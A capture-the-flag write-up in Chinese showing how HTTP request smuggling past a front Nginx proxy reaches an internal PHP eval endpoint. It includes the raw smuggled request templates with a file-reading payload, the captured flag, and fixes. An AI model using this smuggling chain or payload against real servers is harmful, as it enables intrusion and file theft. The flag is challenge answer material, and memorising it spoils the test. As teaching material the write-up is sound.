# pager

## 题目简述

架构包含前置 Nginx 反向代理和后端 Nginx 1.17.6。前置代理把 Host 固定为 frontend，后端另有仅 Host: processor 可达的虚拟主机，其 process.php 会 eval POST 参数 code。旧版 Nginx 的请求走私差异允许把第二个 HTTP 请求藏在第一个请求体中，让后端把它重新解析且保留攻击者指定的 Host。

## 解题过程

构造内部请求：

~~~http
POST /process.php HTTP/1.1
Host: processor
Content-Type: application/x-www-form-urlencoded
Content-Length: <长度>

code=file_get_contents('/flag');
~~~

再把整段作为外层 GET 的 body，并让外层 Content-Length 等于内层请求总长度：

~~~http
GET /trigger404 HTTP/1.1
Host: anything
Content-Length: <内层总长度>

POST /process.php HTTP/1.1
Host: processor
...
~~~

前置代理将外层请求转发到 keepalive 后端连接；受影响后端把 body 余量解析为新请求，于是第二个请求命中 processor 虚拟主机并执行 PHP。由于走私响应不一定回到攻击者连接，官方脚本让 PHP 把 /flag 作为路径或参数请求到攻击者控制的 HTTP 收集端。不要保留比赛时一次性的 webhook 地址，只需替换为自己的接收端。

外带结果为：

~~~text
maple{th3y_5h0uld_r34lly_h1re_n3w_it}
~~~

## 方法总结

请求走私来自代理链对消息边界理解不一致。复现必须使用原始 socket 保留精确 CRLF 与 Content-Length，普通高级 HTTP 库可能重写请求。修复包括升级受影响 Nginx、避免复用存在解析歧义的后端连接，并让内部 vhost 依赖真正的网络隔离和认证，而不是仅靠 Host。
